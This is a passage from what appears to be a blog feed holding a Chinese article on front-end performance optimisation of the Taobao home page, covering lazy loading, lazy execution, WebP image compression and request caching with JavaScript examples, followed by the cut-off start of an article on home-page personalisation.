        <content type="html"><![CDATA[<p>上文 <a href="https://www.barretlee.com/blog/2016/03/31/personality-in-taobao-home-page/">《一起来看看淘宝首页的个性化》</a> 中，带大家看了下弥散着个性化味道的新首页，前端面临着：</p><ul><li>数据来源多</li><li>串行请求渲染一个模块</li><li>运营数据和个性化数据匹配和管理</li><li>数据兜底容灾</li></ul><p>等多个问题。<span id="more"></span>本次淘宝首页改版，虽已不再支持 IE6 和 IE7 等低版本的古董浏览器，但是依然存在多个影响首页性能的因素：</p><ul><li><b>依赖系统过多</b>，数据的请求分为三块，其一是静态资源（如 js&#x2F;css&#x2F;image&#x2F;iconfont 等）；其二是推到 CDN 的静态数据（如运营填写的数据、前端配置信息等）；其三是后端接口，不同的模块对应不同的业务，而且页面中还有不少的广告内容，粗略估计页面刚加载时首屏发出的接口请求就有 8 个，滚到最底下，得发出 20 多个请求。</li><li><b>无法直接输出首屏数据</b>，首屏很多数据是通过异步请求获取的，由于系统限制，这些请求不可避免，而且请求个数较多，十分影响首屏时间。</li><li><b>模块过多</b>，为了能够在后台隔离运营之间填写数据的权限，模块必须做细粒度的拆分，如下图所示：<br><img src="/../blogimgs/2016/04/01/TB1W6IyLVXXXXbQaXXXvLv21FXX-1846-1074.png_800x800.jpg" alt="多模块的拆分"><!--<source src="http://gtms01.alicdn.com/tps/i1/TB1W6IyLVXXXXbQaXXXvLv21FXX-1846-1074.png_800x800.jpg">--><br>一个简单的模块必须拆分成多个行业小模块，页面中其他位置也是如此，而且这些被拆分出来的模块还不一定会展现出来，需要让算法告诉前端展示哪些模块。</li><li><b>图片过多</b>，翻页往下滚动，很明显看到，页面整屏整屏的图片，有些图片是运营填写，有些图片由个性化接口提供，这些图片都没有固定的尺寸。</li></ul><h3 id="网页性能衡量指标"><a href="#网页性能衡量指标" class="headerlink" title="网页性能衡量指标"></a>网页性能衡量指标</h3><p>网页性能衡量指标有很多，倘若能够把握关键的几个，集中优化，性能自然也就上去了。</p><h4 id="FPS"><a href="#FPS" class="headerlink" title="FPS"></a>FPS</h4><p>最能反映页面性能的一个指标是 FPS（frame per second），一般系统设定屏幕的刷新率为 60fps，当页面元素动画、滚动或者渐变时绘制速率小于 60，就会不流畅，小于 24 就会卡顿，小于 12 基本认定卡爆了。</p><p>1 帧的时长约 16ms，除去系统上下文切换开销，每一帧中只留给我们 10ms 左右的程序处理时间，如果一段脚本的处理时间超过 10ms，那么这一帧就可以被认定为丢失，如果处理时间超过 26ms，可以认定连续两帧丢失，依次类推。我们不能容忍页面中多次出现连续丢失五六帧的情况，也就是说必须想办法分拆执行时间超过 80ms 的代码程序，这个工作并不轻松。</p><p>页面在刚开始载入的时候，需要初始化很多程序，也可能有大量耗时的 DOM 操作，所以前 1s 的必要操作会导致帧率很低，我们可以忽略。当然，这是对 PC 而言，Mobile 内容少，无论是 DOM 还是 JS 脚本量都远小于 PC，1s 可能就有点长了。</p><h4 id="DOMContentLoaded-和-Load"><a href="#DOMContentLoaded-和-Load" class="headerlink" title="DOMContentLoaded 和 Load"></a>DOMContentLoaded 和 Load</h4><p>DOM 加载并且解析完成才会触发 DOMContentLoaded 事件，倘若源码输出的内容过多，客户端解析 DOM 的时间也会响应加长，不要小看这里的解析时间，如果 DOM 数量增加 2000 个并且嵌套层级较深，解析时间也会相应增加 50-200ms，这个消耗对大多数页面来说其实是没必要的，保证首屏输出即可，后续的内容只保留钩子，利用 JS 动态渲染。</p><p>Load 时间可以用来衡量首屏加载中，客户端接受的信息总量，如果在首屏中充满了大尺寸图片或者客户端与后端建立连接次数较多，Load 时间也会相应被拖长。</p><h4 id="流畅度"><a href="#流畅度" class="headerlink" title="流畅度"></a>流畅度</h4><p>流畅度是对 FPS 的视觉反馈，FPS 值越高，视觉呈现越流畅。为了保障页面的加载速度，很多内容不会在页面打开的时候全部加载到客户端。这里提到的流畅度是等待过程中的视觉缓冲，如下方是 Google Plus 页面的一个效果图：</p><p><img src="/../blogimgs/2016/04/01/TB1CbQPLVXXXXauXFXXIrP49pXX-446-537.gif" alt="Google Plus Item"><!--<source src="http://gtms04.alicdn.com/tps/i4/TB1CbQPLVXXXXauXFXXIrP49pXX-446-537.gif">--></p><p>墙内访问 google 的速度不是很快，上面元素中的的很多内容都是通过异步方式加载，而从上图可以看出 Google 并没有让用户产生等待的焦虑感。</p><h3 id="淘宝首页的性能优化"><a href="#淘宝首页的性能优化" class="headerlink" title="淘宝首页的性能优化"></a>淘宝首页的性能优化</h3><p>由于平台限制，淘宝首页面临一个先天的性能缺陷，首屏的渲染需要从 7 个不同的后端取数据，这些数据请求是难以合并的，如果用户屏幕比较大，则首屏的面积也比较大，对应的后端平台数据接口就更多。数据是个性化内容或者为广告内容，故请求也不能缓存。</p><h4 id="关键模块优先"><a href="#关键模块优先" class="headerlink" title="关键模块优先"></a>关键模块优先</h4><p>不论用户首屏的面积有多大，<b>保证关键模块优先加载</b>。下面代码片段是初始化所有模块的核心部分：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;.J_Module&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">mod</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> $mod = $(mod);</span><br><span class="line">  <span class="keyword">var</span> name = $mod.<span class="title function_">attr</span>(<span class="string">&#x27;tms&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> data = $mod.<span class="title function_">attr</span>(<span class="string">&#x27;tms-data&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>($mod.<span class="title function_">hasClass</span>(<span class="string">&#x27;tb-pass&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title class_">Reporter</span>.<span class="title function_">send</span>(&#123;</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&quot;跳过模块 &quot;</span> + name</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 保证首屏模块先加载</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/promo|tmall|tanx|notice|member/</span>.<span class="title function_">test</span>(name)) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">requestNextAnimationFrame</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="comment">// 最后一个参数为 Force, 强制渲染, 不懒加载处理</span></span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Loader</span>($mod, data, <span class="regexp">/tanx/</span>.<span class="title function_">test</span>(name));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 剩下的模块进入懒加载队列</span></span><br><span class="line">    lazyQueue.<span class="title function_">push</span>(&#123;</span><br><span class="line">      <span class="attr">$mod</span>: $mod,</span><br><span class="line">      <span class="attr">data</span>: data,</span><br><span class="line">      <span class="attr">force</span>: <span class="regexp">/fixedtool|decorations|bubble/</span>.<span class="title function_">test</span>(name)</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>TMS 输出的模块都会包含一个 <code>.J_Module</code> 钩子，并且会预先加载 js 和 css 文件。</p><p>对于无 JS 内容的模块，会预先打上 <code>tb-pass</code> 的标记，初始化的时候跳过此模块；对于首屏模块关键模块，会直接进入懒加载监控：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// $box 进入浏览器视窗后渲染</span></span><br><span class="line"><span class="comment">// new Loader($box, data) -&gt;</span></span><br><span class="line">datalazyload.<span class="title function_">addCallback</span>($box, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  self.<span class="title function_">loadModule</span>($box, data);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $box 立即渲染</span></span><br><span class="line"><span class="comment">// new Loader($box, data, true) -&gt;</span></span><br><span class="line">self.<span class="title function_">loadModule</span>($box, data);</span><br></pre></td></tr></table></figure><p>除必须立即加载的模块外，关键模块被加到懒加载监控，原因是，部分用户进入页面就可能急速往下拖拽页面，此时，没必要渲染这些首屏模块。</p><p>非关键模块统一送到 <code>lazyQueue</code> 队列，没有基于将非关键模块加入到懒加载监控，这里有两个原因：</p><ul><li>一旦加入监控，程序滚动就需要对每个模块做计算判断，模块太多，这里可能存在性能损失</li><li>如果关键模块还没有加载好，非关键模块进入视窗就会开始渲染，这势必会影响关键模块的渲染</li></ul><p>那么，什么时候开始加载非关键模块呢？</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> __lazyLoaded = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">runLazyQueue</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(__lazyLoaded) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __lazyLoaded = <span class="literal">true</span>;</span><br><span class="line">  $(<span class="variable language_">window</span>).<span class="title function_">detach</span>(<span class="string">&quot;mousemove scroll mousedown touchstart touchmove keydown resize onload&quot;</span>, runLazyQueue);</span><br><span class="line">  <span class="keyword">var</span> <span class="variable language_">module</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="variable language_">module</span> = lazyQueue.<span class="title function_">shift</span>()) &#123;</span><br><span class="line">    ~<span class="keyword">function</span>(<span class="params">m</span>)&#123;</span><br><span class="line">      <span class="comment">// 保证在浏览器空闲时间处理 JS 程序, 保证不阻塞</span></span><br><span class="line">      <span class="variable language_">window</span>.<span class="title function_">requestNextAnimationFrame</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Loader</span>(m.<span class="property">$mod</span>, m.<span class="property">data</span>, m.<span class="property">force</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;(<span class="variable language_">module</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">on</span>(<span class="string">&quot;mousemove scroll mousedown touchstart touchmove keydown resize onload&quot;</span>, runLazyQueue);</span><br><span class="line"><span class="comment">// 担心未触发 onload 事件, 5s 之后执行懒加载队列</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">requestNextAnimationFrame</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">runLazyQueue</span>();</span><br><span class="line">&#125;, <span class="number">5E3</span>);</span><br></pre></td></tr></table></figure><p>上面的代码应该十分清晰，两种请求下会开始将非关键模块加入懒加载监控：</p><ul><li>当页面中触发 <code>mousemove scroll mousedown touchstart touchmove keydown resize onload</code> 这些事件的时候，说明用户开始与页面交互了，程序必须开始加载。</li><li>如果用户没有交互，但是页面已经 onload 了，程序当然不能浪费这个绝佳的空档机会，趁机加载内容；经测试，部分情况下，onload 事件没有触发（原因尚不知），所以还设定了一个超时加载，5s 之后，不论页面加载情况如何，都会将剩下的非关键模块加入到懒加载监控。</li></ul><h4 id="懒执行，有交互才执行"><a href="#懒执行，有交互才执行" class="headerlink" title="懒执行，有交互才执行"></a>懒执行，有交互才执行</h4><p>如果说上面的优化叫做懒加载，那么这里的优化可以称之为懒执行。</p><p>首页上有几个模块是包含交互的，如头条区域的 tab ，便民服务的浮层和主题市场的浮层，部分用户进入页面可能根本不会使用这些功能，所以<b>程序上并没有对这些模块做彻底的初始化</b>，而是等到用户 hover 到这个模块上再执行全部逻辑。</p><h4 id="更懒的执行，刷新页面才执行"><a href="#更懒的执行，刷新页面才执行" class="headerlink" title="更懒的执行，刷新页面才执行"></a>更懒的执行，刷新页面才执行</h4><p>首屏中有两个次要请求，一个是主题市场的 hot 标，将用户最常逛的三个类目打标；第二个是个人中心的背景，不同的城市会展示不同的背景图片，这里需要请求拿到城市信息。</p><p>这两处的渲染策略都是，在程序的 idle（空闲）时期，或者 <code>window.onload</code> 十秒之后去请求，然后将请求的结果缓存到本地，当用户第二次访问淘宝首页时能够看到效果。<b>这是一种更懒的执行，用户刷新页面才看得到</b>.这种优化是产品能够接受，也是技术上合理的优化手段。</p><h4 id="图片尺寸的控制和懒加载"><a href="#图片尺寸的控制和懒加载" class="headerlink" title="图片尺寸的控制和懒加载"></a>图片尺寸的控制和懒加载</h4><p>不论图片链接的来源是运营填写还是接口输出，都难以保证图片具备恰当的宽高，加上如今 retina 的屏幕越来越多，对于这种用户也要提供优质的视觉体验，图片这块的处理并不轻松。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;//g.alicdn.com/s.gif&#x27;</span> <span class="attr">data-src</span>=<span class="string">&#x27;//g.alicdn.com/real/path/to/img.png&#x27;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>阿里 CDN 是支持对图片尺寸做压缩处理的，如下图为 200x200 尺寸的图片：</p><p><img src="/../blogimgs/2016/04/01/TB1JZa9LVXXXXb3XFXXXXXXXXXX-200-200.gif" alt="200x200"><!--<source src="https://img.alicdn.com/tps/TB1JZa9LVXXXXb3XFXXXXXXXXXX-200-200.gif">--></p><p>加上 <code>_100x100.jpg</code> 的参数后，会变成小尺寸：</p><p><img src="/../blogimgs/2016/04/01/TB1JZa9LVXXXXb3XFXXXXXXXXXX-200-200.gif_100x100.jpg" alt="100x100"><!--<source src="https://img.alicdn.com/tps/TB1JZa9LVXXXXb3XFXXXXXXXXXX-200-200.gif_100x100.jpg">--></p><p>我们知道 webp 格式的图片比对应的 jpg 要小三分之一，如上图加上 <code>_.webp</code> 参数后:</p><p><img src="/../blogimgs/2016/04/01/TB1JZa9LVXXXXb3XFXXXXXXXXXX-200-200.gif_100x100.jpg_.webp.jpg" alt="100x100 webp"><!--<source src="https://img.alicdn.com/tps/TB1JZa9LVXXXXb3XFXXXXXXXXXX-200-200.gif_100x100.jpg_.webp">--><br>（不支持 webp 格式的浏览器展示不出来这张图片）</p><p>视觉效果并没有什么折扣，但是图片体积缩小了三分之一，图片越大，节省的越明显。显然，淘宝首页的所有图片都做了如上的限制，针对坑位大小对图片做压缩处理，只是这里需要注意的是，运营填写的图片可能已经是压缩过的，如：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$img = &#x27;//g.alicdn.com/real/path/to/img.png_400x400.jpg&#x27;;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;&#123;&#123;$img&#125;&#125;_100x100jpg_.webp&#x27;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>上面这种情况，图片是不会正确展示的。首页对所有的图片的懒加载都做了统一的函数处理：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">src = src.<span class="title function_">replace</span>(<span class="regexp">/\s/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> arr;</span><br><span class="line"><span class="keyword">if</span> (<span class="regexp">/(_\d&#123;2,&#125;x\d&#123;2,&#125;\w*?\.(?:jpg|png))&#123;2,&#125;/</span>.<span class="title function_">test</span>(src) &amp;&amp; src.<span class="title function_">indexOf</span>(<span class="string">&#x27;_!!&#x27;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">  arr = src.<span class="title function_">split</span>(<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (arr[arr.<span class="property">length</span> - <span class="number">1</span>] == <span class="string">&#x27;.webp&#x27;</span>) &#123;</span><br><span class="line">    src = [arr[<span class="number">0</span>], arr[arr.<span class="property">length</span> - <span class="number">2</span>], arr[arr.<span class="property">length</span> - <span class="number">1</span>]].<span class="title function_">join</span>(<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    src = [arr[<span class="number">0</span>], arr[arr.<span class="property">length</span> - <span class="number">1</span>]].<span class="title function_">join</span>(<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src.<span class="title function_">indexOf</span>(<span class="string">&#x27;_!!&#x27;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">  src = src.<span class="title function_">replace</span>(<span class="regexp">/((_\d&#123;2,&#125;x\d&#123;2,&#125;[\w\d]*?|_co0)\.(jpg|png))+/</span>, <span class="string">&#x27;$1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">WebP</span>.<span class="title function_">isSupport</span>(<span class="keyword">function</span>(<span class="params">isSupportWebp</span>) &#123;</span><br><span class="line">  <span class="comment">// https 协议访问存在问题 IE8，去 schema</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/^http:/</span>.<span class="title function_">test</span>(src)) &#123;</span><br><span class="line">    src = src.<span class="title function_">slice</span>(<span class="number">5</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 支持 webp 格式，并且 host 以 taobaocdn 和 alicdn 结尾，并且不是 s.gif 图片</span></span><br><span class="line">  <span class="keyword">if</span> (isSupportWebp &amp;&amp; <span class="regexp">/(taobaocdn|alicdn)\.com/</span>.<span class="title function_">test</span>(src) &amp;&amp; (src.<span class="title function_">indexOf</span>(<span class="string">&#x27;.jpg&#x27;</span>) ||</span><br><span class="line">    src.<span class="title function_">indexOf</span>(<span class="string">&#x27;.png&#x27;</span>)) &amp;&amp; !<span class="regexp">/webp/</span>.<span class="title function_">test</span>(src) &amp;&amp; !ignoreWebP &amp;&amp; !<span class="regexp">/\/s\.gif$/</span>.<span class="title function_">test</span>(src)) &#123;</span><br><span class="line">    src += <span class="string">&#x27;_.webp&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $img.<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>, src);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="模块去钩子，走配置"><a href="#模块去钩子，走配置" class="headerlink" title="模块去钩子，走配置"></a>模块去钩子，走配置</h4><p>TMS 的模块在输出的时候会将数据的 id 放在钩子上：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;J_Module&#x27;</span> <span class="attr">tms-datakey</span>=<span class="string">&#x27;2483&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果模块是异步展示的，可以通过 <code>tms-datakey</code> 找到模块数据，而首页的个性化是从几十上百个模块中通过算法选出几个，如果把这些模块钩子全部输出来，虽说取数据方便了很多，却存在大量的冗余，对此的优化策略是：将数据格式相同的模块单独拿出来，新建页面作为数据页。所以可以在源码中看到好几段这样的配置信息：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">&quot;tb-hide&quot;</span>&gt;</span>[&#123;&quot;backup&quot;:&quot;false&quot;,&quot;baseid&quot;:&quot;1&quot;,&quot;mid&quot;:&quot;222726&quot;,&quot;name&quot;:&quot;iFashion&quot;,&quot;per&quot;:&quot;false&quot;,&quot;tid&quot;:&quot;3&quot;,&quot;uid&quot;:&quot;1000&quot;&#125;,&#123;&quot;backup&quot;:&quot;false&quot;,&quot;baseid&quot;:&quot;3&quot;,&quot;mid&quot;:&quot;222728&quot;,&quot;name&quot;:&quot;美妆秀&quot;,&quot;per&quot;:&quot;false&quot;,&quot;tid&quot;:&quot;3&quot;,&quot;uid&quot;:&quot;1001&quot;&#125;,&#123;&quot;backup&quot;:&quot;false&quot;,&quot;baseid&quot;:&quot;4&quot;,&quot;mid&quot;:&quot;222729&quot;,&quot;name&quot;:&quot;爱逛街&quot;,&quot;per&quot;:&quot;false&quot;,&quot;tid&quot;:&quot;4&quot;,&quot;uid&quot;:&quot;1002&quot;&#125;,&#123;&quot;backup&quot;:&quot;false&quot;,&quot;baseid&quot;:&quot;2&quot;,&quot;mid&quot;:&quot;222727&quot;,&quot;name&quot;:&quot;全球购&quot;,&quot;per&quot;:&quot;false&quot;,&quot;tid&quot;:&quot;4&quot;,&quot;uid&quot;:&quot;1003&quot;&#125;]<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>减少了大量的源码以及对 DOM 的解析。</p><h4 id="低频修改模块，缓存请求"><a href="#低频修改模块，缓存请求" class="headerlink" title="低频修改模块，缓存请求"></a>低频修改模块，缓存请求</h4><p>有一些模块数据是很少被修改的，比如接口的兜底数据、阿里 APP 模块数据等，可以通过调整参数，设置模块的缓存时间，如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">io</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="variable constant_">URL</span>,</span><br><span class="line">  <span class="attr">dataType</span>: <span class="string">&#x27;jsonp&#x27;</span>,</span><br><span class="line">  <span class="attr">cache</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">jsonpCallback</span>: <span class="string">&#x27;jsonp&#x27;</span> + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="keyword">new</span> <span class="title class_">Date</span> / (<span class="number">1000</span> * <span class="number">60</span>)),</span><br><span class="line">  <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>Math.floor(new Date / (1000 * 60))</code> 这个数值在一分钟内是不会发生变化的，也就是说将这个请求在本地缓存一分钟，对于低频修改模块，缓存时间可以设置为一天，即：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="keyword">new</span> <span class="title class_">Date</span> / (<span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>))</span><br></pre></td></tr></table></figure><p>当然，我们也可以采用本地储存的方式缓存这个模块数据：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">offline.<span class="title function_">setItem</span>(<span class="string">&#x27;cache-moduleName&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data), <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>);</span><br></pre></td></tr></table></figure><p>缓存过期时间设置为 1 天，淘宝首页主要采用本地缓存的方式。</p><h5 id="使用缓动效果减少等待的焦急感"><a href="#使用缓动效果减少等待的焦急感" class="headerlink" title="使用缓动效果减少等待的焦急感"></a>使用缓动效果减少等待的焦急感</h5><p>这方面的优化不是很多，但是也有一点效果，很多模块的展示并不是干巴巴的 <code>.show()</code>，而是通过动画效果，缓动呈现，这方面的优化推荐使用 CSS3 属性去控制，性能消耗会少很多。</p><h3 id="优化的思考角度"><a href="#优化的思考角度" class="headerlink" title="优化的思考角度"></a>优化的思考角度</h3><p>上文 <a href="https://www.barretlee.com/blog/2016/03/31/personality-in-taobao-home-page/">《一起来看看淘宝首页的个性化》</a> 中提到几个黄金法则：</p><ul><li>首屏一定要快</li><li>滚屏一定要流畅</li><li>能不加载的先别加载</li><li>能不执行的先别执行</li><li>渐进展现、圆滑展现</li></ul><p>性能优化的切入角度不仅仅是上几个方面，对照 Chrome 的 Timeline 柱状图和折线图，我们可以找到几个优化的点：</p><p><img src="/../blogimgs/2016/04/01/TB1qwc6LVXXXXcnXXXX5W.tKFXX-1818-1096.png" alt="淘宝首页 Chrome Timeline"><!--<source src="http://gtms02.alicdn.com/tps/i2/TB1qwc6LVXXXXcnXXXX5W.tKFXX-1818-1096.png">--></p><ul><li>在 1.0s 左右存在一次 painting 阻塞，可能因为一次性展示的模块面积过大</li><li>从 FPS 的柱状图可以看出，在 1.5s-2.0s 之间，存在几次 Render 和 JavaScript 丢帧</li><li>从多出的红点可以看出页面 jank 次数，也能够定位到代码堆栈</li></ul><p>在优化的过程中需要更多地思考，如何让阻塞的脚本分批执行，如何将长时间执行的脚本均匀地分配到时间线上。这些优化都体现在代码的细节上，宏观上的处理难以有明显的效果。当然，在宏观上，淘宝首页也有一个明显的优化：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// //gist.github.com/miksago/3035015#file-raf-js</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> lastTime = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> vendors = [<span class="string">&#x27;ms&#x27;</span>, <span class="string">&#x27;moz&#x27;</span>, <span class="string">&#x27;webkit&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> x = <span class="number">0</span>; x &lt; vendors.<span class="property">length</span> &amp;&amp; !<span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span>; ++x) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span> = <span class="variable language_">window</span>[vendors[x]+<span class="string">&#x27;RequestAnimationFrame&#x27;</span>];</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">cancelAnimationFrame</span> = <span class="variable language_">window</span>[vendors[x]+<span class="string">&#x27;CancelAnimationFrame&#x27;</span>] || <span class="variable language_">window</span>[vendors[x]+<span class="string">&#x27;CancelRequestAnimationFrame&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span> = <span class="keyword">function</span>(<span class="params">callback, element</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> currTime = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">      <span class="keyword">var</span> timeToCall = <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="number">0</span>, <span class="number">16</span> - (currTime - lastTime));</span><br><span class="line">      <span class="keyword">var</span> id = <span class="variable language_">window</span>.<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="title function_">callback</span>(currTime + timeToCall); &#125;, timeToCall);</span><br><span class="line">      lastTime = currTime + timeToCall;</span><br><span class="line">      <span class="keyword">return</span> id;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">window</span>.<span class="property">cancelAnimationFrame</span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">cancelAnimationFrame</span> = <span class="keyword">function</span>(<span class="params">id</span>) &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(id);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>这段代码基本保证每个模块的初始化都是在浏览器空闲时期，减少了很多不必要的丢帧。这个优化也可以被应用到每个模块的细节代码之中，不过优化难度会更高。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>代码的性能优化是一个精细活，如果你要在一个庞大的未经优化的页面上做性能优化，可能会面临一次重构代码。本文从淘宝首页个性化引出的问题出发，从微观到宏观讲述了页面的优化实践，提出了几条可以借鉴的「黄金法则」，希望对你有所启发，后续会继续给大家带来淘宝首页稳定性保障的分享。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 淘宝首页 </tag>
            
            <tag> 性能优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一起来看看淘宝首页的个性化</title>
      <link href="/blog/2016/03/31/personality-in-taobao-home-page/"/>
      <url>/blog/2016/03/31/personality-in-taobao-home-page/</url>
      
        <content type="html"><![CDATA[<p>随着互联网技术以及软硬件技术的快速发展，网络已经成为人们生活中不可或缺的一部分，在长期的互联网冲浪中，网民对网络信息的辨识度日益增进，网络信息提供方也必须与时俱进，抓住用户的要害。</p><span id="more"></span><p>就拿我们淘宝的业务来看，几年前看到最多的是以商品为维度分类、分层；而现在，一切以人为中心，围绕用户做产品，帮助用户挖掘消费区间，帮助用户找到自己感兴趣的东西。淘宝首页就被拿出来开了一刀，作为淘宝的门户，它承载了万千入口，如何让用户直达兴趣之地？那自然少不了千人千面地展现内容。今年淘宝首页的改版，无处不散发个性化的味道：</p><h3 id="淘宝首页的个性化需求"><a href="#淘宝首页的个性化需求" class="headerlink" title="淘宝首页的个性化需求"></a>淘宝首页的个性化需求</h3><p>首页的内容运营不是一两个人可以完成的，四五十个业务，每个业务又有很多子业务方向，为了让所有运营有序的在首页编辑数据，主体采用 TMS 搭建，目的是隔离模块权限（当然，目前淘系也没有比 TMS 更适合的平台来搭建首页）。</p><p>为了满足不同产品的需求，同时更好地展现产品特征，设计中采用了大量的色彩，如下图所示：</p><p><img src="/../blogimgs/2016/03/31/TB1KHkKLVXXXXXdXXXXbY7EWpXX-1898-1474.png_1200x1200.jpg" alt="多彩的模块"><!--<source src="https://img.alicdn.com/tps/i2/TB1KHkKLVXXXXXdXXXXbY7EWpXX-1898-1474.png_1200x1200.jpg">--></p><p>同时也为业务提供了多套可供选择的模板：</p><p><img src="/../blogimgs/2016/03/31/TB1aYAqLVXXXXbmXVXXhY.F2FXX-788-1602.png_800x800.jpg" alt="多套模板"><!--<source 